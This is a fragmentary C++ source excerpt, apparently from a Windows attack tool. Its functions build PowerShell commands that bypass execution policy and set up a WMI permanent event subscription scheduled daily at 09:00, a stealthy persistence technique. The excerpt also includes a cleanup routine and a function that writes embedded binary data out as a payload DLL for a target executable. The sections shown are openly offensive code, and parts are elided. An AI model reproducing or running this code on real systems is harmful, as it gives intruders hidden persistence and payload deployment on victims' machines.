...
bool CreatePermanentEventConsumer(const std::string& exePath) {
    std::string cmd = "powershell -ExecutionPolicy Bypass -Command \""
        "$s = [WMISearcher]''; "
        "$s.Options.SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; "
        "$t = Get-WMIObject -Class __Namespace -Namespace 'root\\subscription' -ErrorAction SilentlyContinue; "
        "if (-not $t) { "
        "   $n = [WMIClass]'\\\.\\root\\subscription:__Namespace'; "
        "   $ni = $n.CreateInstance(); "
        "   $ni.Name = 'MySubscriber'; "
        "   $ni.Put() | Out-Null; "
        "}; "
        "$t = Get-WMIObject -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Filter \"FilterName='MyFilter'\" -ErrorAction SilentlyContinue; "
        "if (-not $t) { "
        "   $f = [WMIClass]'\\\.\\root\\subscription:__EventFilter'; "
        "   $fi = $f.CreateInstance(); "
        "   $fi.Name = 'MyFilter'; "
        "   $fi.Query = \\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9 AND TargetInstance.Minute = 0\\\"; "
...
bool RemovePermanentEventConsumer() {
    std::string cmd = "powershell -ExecutionPolicy Bypass -Command \""
        "Get-WMIObject -Class __EventFilter -Namespace 'root\\subscription' -Filter \\\"Name='MyFilter'\\\" | Remove-WMIObject -ErrorAction SilentlyContinue; "
        "Get-WMIObject -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Filter \\\"Name='MyConsumer'\\\" | Remove-WMIObject -ErrorAction SilentlyContinue; "
        "Get-WMIObject -Class __FilterToConsumerBinding -Namespace 'root\\subscription' | Where-Object {$_.Filter -match 'MyFilter'} | Remove-WMIObject -ErrorAction SilentlyContinue; "
        "$n = Get-WMIObject -Class __Namespace -Namespace 'root\\subscription' -Filter \\\"Name='MySubscriber'\\\" -ErrorAction SilentlyContinue; "
        "if ($n) { $n | Remove-WMIObject -ErrorAction SilentlyContinue };\"";
...
bool CreatePayloadDLL(const std::string& outputPath, const std::string& targetExe) {
    std::ofstream dll(outputPath, std::ios::binary);
    if (!dll) return false;
    ...
    dll.write(reinterpret_cast<const char*>(dll_data), sizeof(dll_data));
    dll.close();
    return true;
}
